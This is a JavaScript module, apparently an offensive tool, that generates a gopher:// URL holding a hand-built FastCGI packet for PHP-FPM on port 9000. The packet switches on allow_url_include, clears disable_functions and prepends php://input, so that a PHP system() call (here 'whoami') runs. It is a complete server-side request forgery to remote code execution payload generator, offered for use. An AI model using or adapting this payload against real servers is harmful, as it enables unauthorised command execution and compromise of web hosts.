const querystring = require('querystring');

const gopherGenerator = {
    host: '127.0.0.1',
    port: '9000',
    command: 'system("whoami");',
    filename: '/usr/share/php/PEAR.php',

    generatePayload: function() {
        const length = Buffer.byteLength(this.command) + 8;
        const char = String.fromCharCode(length);

        const data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\t" +
            "REMOTE_ADDR127.0.0.1\x0f\x08" +
            "SERVER_PROTOCOLHTTP/1.1\x0e" +
            String.fromCharCode(Buffer.byteLength(length.toString())) +
            "CONTENT_LENGTH" + length +
            "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n" +
            "disable_functions = \nauto_prepend_file = php://input\x0f" +
            String.fromCharCode(Buffer.byteLength(this.filename)) +
            "SCRIPT_FILENAME" + this.filename + "\r\x01DOCUMENT_ROOT/";

        const temp1 = String.fromCharCode(data.length >> 8);
        const temp2 = String.fromCharCode(data.length & 0xFF);
        const temp3 = String.fromCharCode(data.length % 8);

        const end = "\x00".repeat(data.length % 8) +
            "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00" +
            "<?php " + this.command + "?>\x00\x00\x00\x00";

        const start =
            "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" +
            temp1 + temp2 + temp3 + "\x00";

        let payload = start + data + end;

        payload = querystring.escape(payload)
            .replace(/'/g, '%27')
            .replace(/\(/g, '%28')
            .replace(/\)/g, '%29')
            .replace(/\+/g, '%20');

        return `gopher://${this.host}:${this.port}/_${payload}`;
    }
};

module.exports = gopherGenerator;
